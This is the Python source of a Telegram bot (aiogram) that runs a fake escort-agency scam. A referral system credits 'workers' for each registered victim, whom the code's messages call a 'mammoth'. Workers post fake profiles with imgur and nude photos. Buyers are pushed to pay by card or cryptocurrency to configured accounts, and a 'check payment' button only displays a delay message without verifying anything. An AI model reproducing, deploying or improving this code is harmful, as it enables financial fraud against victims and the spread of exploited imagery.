import random

import aiogram
from aiogram.types import InputMediaPhoto

import db_hendlers
from misc import config, logging, conn, cursor, bot, dispatcher as dp
from aiogram import executor, types
import db_hendlers as db
from aiogram.dispatcher import FSMContext
from States import Register, AdminDeleteForm, AdminAddWorker, AddModelWorker
import messages as s_msg
import keyboards as nav

logging.basicConfig(level=logging.INFO)
cities = []
with open("addons/cities.txt", "r", encoding="utf-8") as file:
    for line in file.readlines():
        cities.append(line.replace("\n", ""))

def extract_unique_code(text):
    # Extracts the unique_code from the sent /start command.
    return text.split()[1] if len(text.split()) > 1 else None

# РЕГИСТРАЦИЯ
@dp.message_handler(commands=["start"], state="*")
async def start(msg: types.Message, state: FSMContext):
    args = msg.get_args()
    ref_code = args if args else None

    user_id = msg.from_user.id
    user = db_hendlers.get_user(cursor, user_id)
    if user is None:
        await state.update_data(ref_code=ref_code)

        await Register.city.set()
        await bot.send_message(user_id, text=s_msg.get_city, parse_mode="HTML")
    else:
        if str(msg.from_user.id) == str(config["Admin"]["admin"]):
            isAdmin = True
        else:
            isAdmin = False
        with open('addons/photos/start.jpg', 'rb') as photo_file:
            photo = types.InputFile(photo_file)
            await bot.send_photo(user_id, photo=photo, caption=s_msg.start_registered.format(config["Bot"]["name"]), reply_markup=nav.main_menu(isAdmin, user))

#воркер панель
@dp.message_handler(commands=["worker"])
async def start(msg: types.Message):
    user = db.get_worker(cursor, msg.from_user.id)
    if user is not None:
        name_bot = await bot.get_me()
        name_bot = name_bot["username"]
        link = f"https://t.me/{name_bot}?start={msg.from_user.id}"
        manuals = config["Manuals"]
        await bot.send_message(msg.from_user.id, text=s_msg.worker_menu.format(link, manuals["manual_1"], manuals["manual_2"],
                                                      manuals["manual_create_anketa"]), reply_markup=nav.worker_panel(), disable_web_page_preview=True, parse_mode="HTML")




@dp.message_handler(state=Register.city, content_types=["text"])
async def get_city(msg: types.Message, state: FSMContext):
    user_id = msg.from_user.id
    user = db.get_user(cursor, user_id)
    city = msg.text

    user_data = await state.get_data()
    ref_code = user_data.get('ref_code')

    if city in cities:
        if ref_code:
            db.add_user(conn, cursor, user_id, city, ref_code)
            cursor.execute("UPDATE workers SET count_ref=count_ref + 1 WHERE worker_id=?;", (ref_code,))
            conn.commit()
            await bot.send_message(ref_code,
                                   f"Новый мамонт зарегистрировался по вашему реферальному коду: {msg.from_user.full_name}")
        else:
            db.add_user(conn, cursor, user_id, city, 0)

        await state.finish()
        await bot.send_message(user_id, text=s_msg.get_city_good)
        if str(msg.from_user.id) == str(config["Admin"]["admin"]):
            isAdmin = True
        else:
            isAdmin = False
        await bot.send_photo(user_id, photo="https://i.pinimg.com/originals/f5/89/8a/f5898ac86f50db0cfc29ad73fbc60955.jpg", caption=s_msg.start_registered.format(config["Bot"]["name"]), reply_markup=nav.main_menu(isAdmin, user))
    else:
        await bot.send_message(user_id, text=s_msg.get_city_undefined)
# ОБРАБОТКА ТЕКСТ


@dp.message_handler(content_types=["text"])
async def get_city(msg: types.Message, state: FSMContext):
    user_id = msg.from_user.id
    text = msg.text
    user = db_hendlers.get_user(cursor, user_id)

    if user is None:
        return bot.send_message(user_id, text="Для начала пропишите /start")
    if text == nav.profile_b:
        count_girls = db_hendlers.get_count_girls(cursor)
        await bot.send_message(user_id, text=s_msg.profile.format(user[0], user[4], user[3], count_girls), reply_markup=nav.profile())
    elif text == nav.admin_b:
        if int(config["Admin"]["admin"]) == msg.from_user.id:
            await msg.reply(text="Админка активэйтид ебать", reply_markup=nav.admin_panel())
    elif text == nav.models_b:
        models = db.get_all_girls(cursor)
        count = len(models)
        if count > 0:
            await bot.send_message(user_id, text=f"💝 Все анкеты проходили строгую проверку личности нашим агентством. Свободны сейчас: {count}", reply_markup=nav.show_all_models(1, models))
        else:
            await bot.send_message(user_id, text="Все девочки заняты, попробуйте пожалуйста позже:(")
    elif text == nav.worker_b:
        name_bot = await bot.get_me()
        name_bot = name_bot["username"]
        link = f"https://t.me/{name_bot}?start={msg.from_user.id}"
        manuals = config["Manuals"]
        await bot.send_message(user_id, text=s_msg.worker_menu.format(link, manuals["manual_1"], manuals["manual_2"],
                                                      manuals["manual_create_anketa"]), reply_markup=nav.worker_panel(), disable_web_page_preview=True, parse_mode="HTML")
    elif text == nav.info_b:
        await bot.send_message(user_id, text=s_msg.information,
                               reply_markup=nav.inforamation_buttons())

@dp.callback_query_handler(text="my_orders_user")
async def delete_form(call: types.CallbackQuery):
    await bot.answer_callback_query(callback_query_id=call.id, text="❌ Вы ещё не заказывали моделей", show_alert=True)


@dp.message_handler(content_types=types.ContentType.PHOTO)
async def handle_photo(message: types.Message):
    photo = message.photo[-1]  # берем последний (наибольший) размер фотографии
    photo_id = photo.file_id
    await message.reply(f"ID фотографии: {photo_id}")


# АДМИНКА
# Удалить модель
@dp.callback_query_handler(text="delete_form_admin")
async def delete_form(call: types.CallbackQuery, state: FSMContext):
    await call.message.edit_text("Введите айди анкеты для удаления:")
    await AdminDeleteForm.form_id.set()


@dp.message_handler(state=AdminDeleteForm.form_id)
async def delete_form_get_id(msg: types.Message, state: FSMContext):
    if msg.text.isdigit():
        model = db.get_form(cursor, msg.text)
        if model is None:
            await msg.reply("Модели с таким айди нет! Проверьте ещё раз какие модели есть и попробуйте ещё раз!",
                            reply_markup=nav.admin_panel())
        else:

            req = db.delete_form(conn, cursor, int(msg.text))
            if req is True:
                photo = str(model[6]).split("_")[0]
                await msg.reply("Модель успешно удалена!", reply_markup=nav.admin_panel())
                await bot.send_photo(model[8], photo=photo, caption=f"❌ Ваша модель была удалена администратором!\n\nИмя: {model[1]}\nВозраст: {model[2]}")
            else:
                await msg.reply("Что-то пошло не так!", reply_markup=nav.admin_panel())
        await state.finish()
    else:
        await msg.reply("Айди модели должен быть цклым числом, пример: 12")


# Добавить воркера
@dp.callback_query_handler(text="give_worker")
async def delete_form(call: types.CallbackQuery, state: FSMContext):
    await call.message.edit_text("Введите айди ЮЗЕРА которого сделаем воркером:")
    await AdminAddWorker.worker_id.set()


@dp.message_handler(state=AdminAddWorker.worker_id)
async def delete_form_get_id(msg: types.Message, state: FSMContext):
    if msg.text.isdigit():
        user = db.get_user(cursor, msg.text)
        if user is None:
            await msg.reply("Юзера с таким айди нет! Проверьте ещё раз какие модели есть и попробуйте ещё раз!",
                            reply_markup=nav.admin_panel())
        else:
            req = db.change_status(conn, cursor, int(msg.text))
            if req is True:
                await msg.reply("Статус воркера успешно вынан!", reply_markup=nav.admin_panel())
                await bot.send_message(user[0], text="Вам выдан статус воркера!\nДля использования воркер панели, пишите /worker")
            else:
                await msg.reply("Что-то пошло не так! Возможно юзера с таким айди нет! Либо у юзера уже есть статус воркера!", reply_markup=nav.admin_panel())
        await state.finish()
    else:
        await msg.reply("Айди юзера должен быть целым числом, пример: 6345231676")

# Воркер панель


@dp.callback_query_handler(text="add_model_worker")
async def worker_panel(call: types.CallbackQuery, state: FSMContext):
    await call.message.edit_text(s_msg.add_model_worker, reply_markup=nav.close_tab(), disable_web_page_preview=True, parse_mode="HTML")
    await AddModelWorker.about.set()


@dp.message_handler(state=AddModelWorker.about)
async def add_model_worker(msg: types.Message, state: FSMContext):
    user = db.get_user(cursor, msg.from_user.id)
    async with state.proxy() as data:
        try:
            anketa = msg.text.split("\n")
            girl_name = anketa[0]
            age = anketa[1]
            price_per_hour = anketa[2]
            about = anketa[3]
            services = anketa[4]
            photos = anketa[5]
            nude_photos = anketa[6]
            photo = anketa[5].split(";")[0]
        except Exception as ex:
            return await msg.reply("Формат не правильный!\nПовтори ввод:")
        if not age.isdigit():
            return await msg.reply("Возвраст должен быть целым числом!\nПовтори ввод:")
        if not price_per_hour.isdigit():
            return await msg.reply("Время за час должно быть целым числом!\nПовтори ввод:")
        if not photos.__contains__("imgur"):
            return await msg.reply("Ссылок на фотки имгур не найдено!\nПовтори ввод:")
        if not nude_photos.__contains__("imgur"):
            if not nude_photos.__contains__("0"):
                return await msg.reply("Ссылок на нюдсы имгур не найдено!\nПовтори ввод:")

        data_girl = [girl_name, age, price_per_hour, about, services, photos, nude_photos]
        data["data_girl"] = data_girl
        await AddModelWorker.confirm.set()
        price_per_2_hour = int(float(price_per_hour) * 1.8)
        price_per_night = int(float(price_per_2_hour) * 1.8)
        await bot.send_photo(msg.from_user.id, photo=photo, caption=s_msg.show_model.format(girl_name, user[1], price_per_hour, price_per_2_hour, price_per_night, about), reply_markup=nav.confirm_add_girl())


@dp.callback_query_handler(state=AddModelWorker.confirm, text_contains="confirm_add_girl_")
async def add_model_worker(call: types.CallbackQuery, state: FSMContext):
    answer = call.data.split("_")[3]
    if int(answer) == 1:
        async with state.proxy() as data:
            data_girl = data["data_girl"]
            req = db.add_girl(conn, cursor, call.from_user.id, data_girl)
            if req is True:
                await bot.send_message(call.from_user.id, "Девочка успешно добавлена!", reply_markup=nav.worker_panel())
                cursor.execute("UPDATE workers SET count_forms=count_forms + 1 WHERE worker_id=?;", (call.from_user.id, ))
                conn.commit()
            else:
                await bot.send_message(call.from_user.id, "Ошибка добавления, попробуй заного!", reply_markup=nav.worker_panel())
            await state.finish()
    else:
        await state.finish()
        await call.message.delete()
        await bot.send_message(call.from_user.id, text="Действие отменено!", reply_markup=nav.worker_panel())


# Модели воркера
@dp.callback_query_handler(text="my_models_worker")
async def add_model_worker(call: types.CallbackQuery):
    user_id = call.from_user.id
    models = db.get_all_girls_worker(cursor, user_id)
    if len(models) == 0:
        await bot.answer_callback_query(call.id, text="💝 У вас ещё нет анкет")
    else:
        for girl in models:
            photo = str(girl[6]).split(";")[0]
            try:
                await call.message.delete()
            except aiogram.utils.exceptions.MessageToDeleteNotFound:
                pass
            await bot.send_photo(call.from_user.id, photo=photo,
                                 caption=f"Номер анкеты: {girl[0]}\n\nИмя: {girl[1]}\nВозраст: {girl[2]}")


@dp.callback_query_handler(text="statistic_worker")
async def add_model_worker(call: types.CallbackQuery):
    worker = db.get_worker_stat(cursor, call.from_user.id)
    await bot.send_message(call.from_user.id, text=f"Ваша статистика:\n\nКоличество рефераллов: {worker[1]}\n\nКоличество анкет: {worker[2]}")


@dp.callback_query_handler(text="help_admin")
async def add_model_worker(call: types.CallbackQuery):
    support = config["Admin"]["username"]
    await bot.send_message(call.from_user.id, text=f"Для обратной связи с админом, пишите сюда - {support}")

#MODELS
# ВЫБОР СТРАНИЦЫ
@dp.callback_query_handler(text="close_tab")
async def add_model_worker(call: types.CallbackQuery):
    await call.message.delete()


@dp.callback_query_handler(text_contains="change_page_")
async def add_model_worker(call: types.CallbackQuery):
    index_page = int(call.data.split("_")[2])
    models = db.get_all_girls(cursor)
    count = len(models)
    await call.message.edit_text(
                           text=f"💝 Все анкеты проходили строгую проверку личности нашим агентством. Свободны сейчас: {count}",
                           reply_markup=nav.show_all_models(index_page, models))


@dp.callback_query_handler(text_contains="show_girl_number_")
async def show_girl_number(call: types.CallbackQuery):
    girl_index = int(call.data.split("_")[3])
    page_index = int(call.data.split("_")[4])
    user_id = call.from_user.id
    girl = db.get_form(cursor, girl_index)
    user = db.get_user(cursor, user_id)
    price_per_hour = int(girl[3])
    price_per_2_hour = int(float(price_per_hour) * 1.8)
    price_per_night = int(float(price_per_2_hour) * 1.8)
    photo = str(girl[6]).split(";")[0]
    try:
        await call.message.delete()
    except aiogram.utils.exceptions.MessageToDeleteNotFound:
        pass
    await bot.send_photo(call.from_user.id, photo=photo,
                         caption=s_msg.show_model.format(girl[1], user[1], price_per_hour, price_per_2_hour,
                                                         price_per_night, girl[4]), reply_markup=nav.model_keys(girl, page_index))


@dp.callback_query_handler(text_contains="girl_services_")
async def add_model_worker(call: types.CallbackQuery):
    girl_index = int(call.data.split("_")[2])
    girl = db.get_form(cursor, girl_index)
    await bot.answer_callback_query(callback_query_id=call.id, text=girl[5], show_alert=True)


@dp.callback_query_handler(text_contains="girl_another_photo_")
async def add_model_worker(call: types.CallbackQuery):
    girl_index = int(call.data.split("_")[3])
    page_index = int(call.data.split("_")[4])
    girl = db.get_form(cursor, girl_index)
    message = call.message
    chat_id = message.chat.id
    photos = str(girl[6]).split(";")
    photo = random.choice(photos)
    await call.message.delete()
    await bot.send_photo(
        chat_id=chat_id,
        photo=photo,
        caption=call.message.text,
        reply_markup=nav.model_keys(girl, page_index)
    )


@dp.callback_query_handler(text_contains="girl_nudes_photos_")
async def add_model_worker(call: types.CallbackQuery):
    girl_index = int(call.data.split("_")[3])
    girl = db.get_form(cursor, girl_index)
    page_index = int(call.data.split("_")[4])
    message = call.message
    chat_id = message.chat.id
    photo = str(girl[6]).split(";")[0]
    await call.message.delete()
    await bot.send_photo(
        chat_id=chat_id,
        photo=photo,
        caption="Выберите метод оплаты:",
        reply_markup=nav.choose_payment(girl, page_index, 3000)
    )



# Покупка девочки
@dp.callback_query_handler(text_contains="girl_buy_")
async def buy_model(call: types.CallbackQuery):
    girl_index = int(call.data.split("_")[2])
    girl = db.get_form(cursor, girl_index)
    page_index = int(call.data.split("_")[3])
    message = call.message
    chat_id = message.chat.id
    photos = str(girl[6]).split(";")
    photo = random.choice(photos)
    await call.message.delete()
    await bot.send_photo(
        chat_id=chat_id,
        photo=photo,
        caption="Выберите время на которое вы хотите оформить модель:",
        reply_markup=nav.buy_girl(girl, page_index)
    )


@dp.callback_query_handler(text_contains="buy_per_")
async def add_model_worker(call: types.CallbackQuery):
    price = int(call.data.split("_")[2])
    girl_index = int(call.data.split("_")[3])
    page_index = int(call.data.split("_")[4])
    girl = db.get_form(cursor, girl_index)
    message = call.message
    chat_id = message.chat.id
    photos = str(girl[6]).split(";")
    photo = random.choice(photos)
    await call.message.delete()
    await bot.send_photo(
        chat_id=chat_id,
        photo=photo,
        caption="Выберите способ оплаты:",
        reply_markup=nav.choose_payment(girl, page_index, price)
    )


@dp.callback_query_handler(text_contains="choose_payment_")
async def add_model_worker(call: types.CallbackQuery):
    setting = config["Payments"]
    support = config["Support"]["support_username"]
    data = call.data.split("_")
    girl_index = data[2]
    index_page = data[3]
    price = data[4]
    prices = {"card": int(price), "tex": int(price), "usdt": round(float(price) * 0.012, 4), "eth": round(float(price) * 0.0000066, 4), "btc": round(float(price) * 0.00000043, 4)}

    payment_type = data[5]
    girl = db.get_form(cursor, girl_index)
    message = call.message
    chat_id = message.chat.id
    photo = str(girl[6]).split(";")[0]
    if payment_type == "card":
        text = str(s_msg.payment_types[payment_type]).format(girl[1], price, setting["card"])
    elif payment_type == "tex":
        text = str(s_msg.payment_types[payment_type]).format(support)
    else:
        text = str(s_msg.payment_types[payment_type]).format(girl[1], price, setting[payment_type], prices[payment_type])
    await call.message.delete()

    # Ensure no special characters in the text are causing issues
    text = text.replace("_", "\\_").replace("[", "\\[").replace("]", "\\]").replace("(",
                                                                                                        "\\(").replace(
        ")", "\\)").replace("~", "\\~").replace(">", "\\>").replace("#", "\\#").replace("+",
                                                                                                            "\\+").replace("=", "\\=").replace("|", "\\|").replace("{", "\\{").replace("}", "\\}").replace(".",
                                                                                                            "\\.").replace(
        "!", "\\!")

    if payment_type == "tex":
        await bot.send_photo(
            chat_id=call.from_user.id,
            photo=photo,
            caption=text,
            reply_markup=nav.back_page(girl, index_page),
            parse_mode="MARKDOWN"
        )
    else:
        await bot.send_photo(
            chat_id=call.from_user.id,
            photo=photo,
            caption=text,
            reply_markup=nav.check_payment(girl, index_page),
            parse_mode="MARKDOWN"
        )


@dp.callback_query_handler(text_contains="check_payment")
async def add_model_worker(call: types.CallbackQuery):
    data = str(call.data).split("_")
    girl = db.get_form(cursor, data[2])
    index_page = data[3]
    await bot.answer_callback_query(callback_query_id=call.id, text="Оплата проверяется от 10 до 60 минут", show_alert=False)


@dp.callback_query_handler(text_contains="girl_back_")
async def add_model_worker(call: types.CallbackQuery):
    index_page = int(call.data.split("_")[2])
    await call.message.delete()
    models = db.get_all_girls(cursor)
    count = len(models)
    await bot.send_message(call.from_user.id,
        text=f"💝 Все анкеты проходили строгую проверку личности нашим агентством. Свободны сейчас: {count}",
        reply_markup=nav.show_all_models(index_page, models))

if __name__ == "__main__":
    executor.start_polling(dispatcher=dp)
